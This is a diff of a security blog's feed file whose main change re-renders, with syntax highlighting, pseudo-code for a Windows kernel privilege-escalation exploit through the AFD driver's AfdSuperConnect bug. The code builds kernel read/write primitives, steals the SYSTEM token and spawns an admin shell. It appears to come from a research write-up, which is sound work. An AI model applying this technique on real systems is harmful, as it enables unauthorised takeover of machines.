@@ -322,37 +322,37 @@ we can find the address of both our &lt;code>_EPROCESS&lt;/code> structure (solv
 Now, using the read primitive, we can iterate through our &lt;code>_EPROCESS&lt;/code> structure and locate the &lt;code>_TOKEN&lt;/code> structure.
 This then gives us the offset of the &lt;code>Token&lt;/code> field.&lt;/p>
 &lt;p>Putting it all together in pseudo-code, it looks something like this:&lt;/p>
-&lt;pre tabindex="0">&lt;code>// Use the Windows API to get all the information we want.
-token, process := find_token_and_process_using_NtQuerySystemInformation();
-PsInitialSystemProcess_export, read_function, write_function := find_exported_symbols_using_NtQuerySystemInformation();
-// Use a system call that is more or less equivalent to `socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)`
-socket_handle := NtCreateFile(&amp;quot;\\Device\\Afd&amp;quot;, EaBuffer = {AF_INET, SOCK_STREAM, IPPROTO_TCP});
-// use the system call that is equivalent to `setsockopt(socket, IPPROTO_TCP, TCP_FASTOPEN, &amp;amp;(u32){1}, 1)`
-NtDeviceIoControlFile(socket_handle, 0x120bf, .input_buffer = {SetSockOpt, .level = IPPROTO_TCP, .option = TCP_FASTOPEN, .optval = &amp;amp;(u32){1}, .optlen = 1});
-// use the system call that is equivalent to `bind(socket, &amp;amp;(struct sockaddr){AF_INET}, sizeof(struct sockaddr))`
-NtDeviceIoControlFile(socket_handle, 0x12003, ...);
-// The read and write primitives now work by triggering the vulnerability by calling `AfdSuperConnect` through the `NtDeviceIoControlFile`.
-function u64 read_u64(u64 address):
-read_argument := {.pointer = address};
-NtDeviceIoControlFile(socket_handle, 0x120c7, .input_buffer = {.sockaddr = {AF_INET, .offset_0x5c = read_function, .offset_0x64 = &amp;amp;read_argument}});
-return read_argument.value;
-function void write_u64(u64 address, u64 value):
-write_argument := {.pointer = address, .value = value};
-NtDeviceIoControlFile(socket_handle, 0x120c7, .input_buffer = {.sockaddr = {AF_INET, .offset_0x5c = write_function, .offset_0x64 = &amp;amp;write_argument}});
-// figure out the token_offset, by linearly scanning through our `_EPROCESS`
-for i from 0 to 0x1000:
-maybe_token := read_u64(process + i * 8);
-if maybe_token == token:
-token_offset = i * 8;
-break;
-// figure out the `_TOKEN` of `nt!PsInitialSystemProcess`
-PsInitialSystemProcess = read_u64(PsInitialSystemProcess_export);
-PsInitialSystemProcessToken = read_u64(PsInitialSystemProcess + token_offset);
-// actually steal the access `_TOKEN` to give us complete access rights.
-write_u64(token + token_offset, PsInitialSystemProcessToken);
-// spawn a shell to keep the access rights in a clean way.
-spawn_shell();
-&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://lolcads.github.io/2022/06/success.png" alt="Success - An Administrator Shell">&lt;/p></content></item><item><title>Installing new .NET versions on a Windows 7 VM</title><link>https://lolcads.github.io/posts/2022/03/win7_dotnet_install/</link><pubDate>Wed, 16 Mar 2022 12:01:43 +0100</pubDate><guid>https://lolcads.github.io/posts/2022/03/win7_dotnet_install/</guid><description>Installing new .NET versions on a Windows 7 VM In this post, I will explain how to install .NET Framework 4.8 on a Windows 7 VM.
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#75715e">// Use the Windows API to get all the information we want.
+&lt;/span>&lt;span style="color:#75715e">&lt;/span>token, process :&lt;span style="color:#f92672">=&lt;/span> find_token_and_process_using_NtQuerySystemInformation();
+PsInitialSystemProcess_export, read_function, write_function :&lt;span style="color:#f92672">=&lt;/span> find_exported_symbols_using_NtQuerySystemInformation();
+&lt;span style="color:#75715e">// Use a system call that is more or less equivalent to `socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)`
+&lt;/span>&lt;span style="color:#75715e">&lt;/span>socket_handle :&lt;span style="color:#f92672">=&lt;/span> NtCreateFile(&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">Device&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">Afd&amp;#34;&lt;/span>, EaBuffer &lt;span style="color:#f92672">=&lt;/span> {AF_INET, SOCK_STREAM, IPPROTO_TCP});
+&lt;span style="color:#75715e">// use the system call that is equivalent to `setsockopt(socket, IPPROTO_TCP, TCP_FASTOPEN, &amp;amp;(u32){1}, 1)`
+&lt;/span>&lt;span style="color:#75715e">&lt;/span>NtDeviceIoControlFile(socket_handle, &lt;span style="color:#ae81ff">0x120bf&lt;/span>, .input_buffer &lt;span style="color:#f92672">=&lt;/span> {SetSockOpt, .level &lt;span style="color:#f92672">=&lt;/span> IPPROTO_TCP, .option &lt;span style="color:#f92672">=&lt;/span> TCP_FASTOPEN, .optval &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>(u32){&lt;span style="color:#ae81ff">1&lt;/span>}, .optlen &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>});
+&lt;span style="color:#75715e">// use the system call that is equivalent to `bind(socket, &amp;amp;(struct sockaddr){AF_INET}, sizeof(struct sockaddr))`
+&lt;/span>&lt;span style="color:#75715e">&lt;/span>NtDeviceIoControlFile(socket_handle, &lt;span style="color:#ae81ff">0x12003&lt;/span>, ...);
+&lt;span style="color:#75715e">// The read and write primitives now work by triggering the vulnerability by calling `AfdSuperConnect` through the `NtDeviceIoControlFile`.
+&lt;/span>&lt;span style="color:#75715e">&lt;/span>function u64 &lt;span style="color:#a6e22e">read_u64&lt;/span>(u64 address)&lt;span style="color:#f92672">:&lt;/span>
+read_argument :&lt;span style="color:#f92672">=&lt;/span> {.pointer &lt;span style="color:#f92672">=&lt;/span> address};
+NtDeviceIoControlFile(socket_handle, &lt;span style="color:#ae81ff">0x120c7&lt;/span>, .input_buffer &lt;span style="color:#f92672">=&lt;/span> {.sockaddr &lt;span style="color:#f92672">=&lt;/span> {AF_INET, .offset_0x5c &lt;span style="color:#f92672">=&lt;/span> read_function, .offset_0x64 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>read_argument}});
+&lt;span style="color:#66d9ef">return&lt;/span> read_argument.value;
+function &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">write_u64&lt;/span>(u64 address, u64 value)&lt;span style="color:#f92672">:&lt;/span>
+write_argument :&lt;span style="color:#f92672">=&lt;/span> {.pointer &lt;span style="color:#f92672">=&lt;/span> address, .value &lt;span style="color:#f92672">=&lt;/span> value};
+NtDeviceIoControlFile(socket_handle, &lt;span style="color:#ae81ff">0x120c7&lt;/span>, .input_buffer &lt;span style="color:#f92672">=&lt;/span> {.sockaddr &lt;span style="color:#f92672">=&lt;/span> {AF_INET, .offset_0x5c &lt;span style="color:#f92672">=&lt;/span> write_function, .offset_0x64 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>write_argument}});
+&lt;span style="color:#75715e">// figure out the token_offset, by linearly scanning through our `_EPROCESS`
+&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">for&lt;/span> i from &lt;span style="color:#ae81ff">0&lt;/span> to &lt;span style="color:#ae81ff">0x1000&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
+maybe_token :&lt;span style="color:#f92672">=&lt;/span> read_u64(process &lt;span style="color:#f92672">+&lt;/span> i &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>);
+&lt;span style="color:#66d9ef">if&lt;/span> maybe_token &lt;span style="color:#f92672">==&lt;/span> token:
+token_offset &lt;span style="color:#f92672">=&lt;/span> i &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>;
+&lt;span style="color:#66d9ef">break&lt;/span>;
+&lt;span style="color:#75715e">// figure out the `_TOKEN` of `nt!PsInitialSystemProcess`
+&lt;/span>&lt;span style="color:#75715e">&lt;/span>PsInitialSystemProcess &lt;span style="color:#f92672">=&lt;/span> read_u64(PsInitialSystemProcess_export);
+PsInitialSystemProcessToken &lt;span style="color:#f92672">=&lt;/span> read_u64(PsInitialSystemProcess &lt;span style="color:#f92672">+&lt;/span> token_offset);
+&lt;span style="color:#75715e">// actually steal the access `_TOKEN` to give us complete access rights.
+&lt;/span>&lt;span style="color:#75715e">&lt;/span>write_u64(token &lt;span style="color:#f92672">+&lt;/span> token_offset, PsInitialSystemProcessToken);
+&lt;span style="color:#75715e">// spawn a shell to keep the access rights in a clean way.
+&lt;/span>&lt;span style="color:#75715e">&lt;/span>spawn_shell();
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://lolcads.github.io/2022/06/success.png" alt="Success - An Administrator Shell">&lt;/p></content></item><item><title>Installing new .NET versions on a Windows 7 VM</title><link>https://lolcads.github.io/posts/2022/03/win7_dotnet_install/</link><pubDate>Wed, 16 Mar 2022 12:01:43 +0100</pubDate><guid>https://lolcads.github.io/posts/2022/03/win7_dotnet_install/</guid><description>Installing new .NET versions on a Windows 7 VM In this post, I will explain how to install .NET Framework 4.8 on a Windows 7 VM.
 Motivation Virtual Machines running Microsoft Windows are frequently used for dynamic analysis of Windows executables. Windows 7 is still used for analysis VM, although it is no longer supported by Microsoft and ships with an outdated .NET version. If a sample requires a .NET version which is not present on the analysis VM, the execution fails and the file cannot be analysed.</description><content>&lt;h1 id="installing-new-net-versions-on-a-windows-7-vm">Installing new .NET versions on a Windows 7 VM&lt;/h1>
 &lt;p>In this post, I will explain how to install .NET Framework 4.8 on a Windows 7 VM.&lt;/p>
 &lt;h2 id="motivation">Motivation&lt;/h2>
